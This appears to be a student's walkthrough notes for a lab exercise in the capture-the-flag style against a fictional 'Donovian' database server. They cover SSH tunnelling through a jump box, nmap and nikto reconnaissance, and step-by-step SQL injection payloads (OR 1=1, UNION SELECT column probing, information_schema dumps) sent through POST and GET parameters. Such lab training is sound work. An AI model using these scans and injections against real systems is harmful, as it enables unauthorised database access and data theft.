# 2 encoding methods
- base64
- rot13(Windows)

## Create Admin User (8): No Collaboration

Donovian Database Exploitation (DWDBE)
XX Dec 2026
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.

Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 
```
5QL1nj3ct5t@rt0F@ct1v1ty 
```

Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.
```
Scheme of Maneuver:
>Jump Box: 10.50.37.98	
->T1:10.100.28.48
```
```
Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: Apache/2.4.29 (Ubuntu) Server
Creds:unknown
Last Known SSH Port: 4444
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
```

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
---------------------------------------------|
	* if no socket file then, make one.  |
ssh -MS /tmp/jump student@10.50.37.98	     |
				^ jump IP    |
					     |
	* if no dynamic port, make one.      |
ssh -S /tmp/jump jump -O forward -D 9050     |
---------------------------------------------|
```

# On lin-ops
Recon: Utilize pro
* after getting the dynamic tunnel running 
```
proxychains nmap 10.100.28.48
proxychains nc 10.100.28.40 {ports[s]}
proxychains nmap --script http-enum 10.100.28.48
```
* results for ^
```
Nmap scan report for 10.100.28.48
Host is up (0.00041s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
```

* utilize nikto
```
proxychains nikto v -h 10.100.28.48
```
* nikto results:
```
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2024-09-19 17:07:29 (GMT0) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

* check your connections
```
ss- ntlp
```
* Leveraging your existing Socket /tmp/jump, make a port forward targeting the Target's vulnerable ports
```
ssh -S /tmp/jump jump -O forward -L 127.0.0.1:1111:10.100.28.48:80
```
* then open a firefox web browser
```
firefox
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# On firefox:
* navigate to the device via the Port Forward you added to you Socket File:
```
127.0.0.1:1111
```
* Enumerating the directories discovered in your htt-enum script
```
127.0.0.1:1111/css
127.0.0.1:1111/images
127.0.0.1:1111/includes
127.0.0.1:1111/js
127.0.0.1:1111/scripts
```
## SQL Injections via HTTP POST/GET request methods

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# POST Method (Interacting with input fields)
### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4: Craft more tailored queries



## step 1: Determine the vulnerable field
```{option}' OR 1='1```
## step 2: Identify number of columns
```
{option}' UNION SELECT 1,2,3,4 #
{option}' UNION SELECT 1,2,3,4,5 #
```
## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)

* 4 columns displayed, column 2 hidden
```
UNION SELECT table_schema,table_name,column_name from information_schema.columns #
```
```
UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
```
## step 4:  Craft more tailored queries

```
'{option:Audi} 'UNION SELECT TYPE,2,cost,color,year from session.car #'
```
```
'Audi ' UNION SELECT carid,2,type,name,year from session.car #'
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# GET Method (Interact with URL)

### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4:  Craft more tailored queries



## step 1: Determine the vulnerable field
- Choose {option} from radio button, then click submit
  - interact with url:
```
{Selection}=4 OR 1=1 (for each selection 1..4)
```


## step 2: Identify number of columns
``` 
Selection=2 UNION, SELECT 1,2,3
```

## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
``` 
UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
## step 4:  Craft more tailored queries
``` 
UNION SELECT table_schema,column_name,table_name from information_schema.columns
```
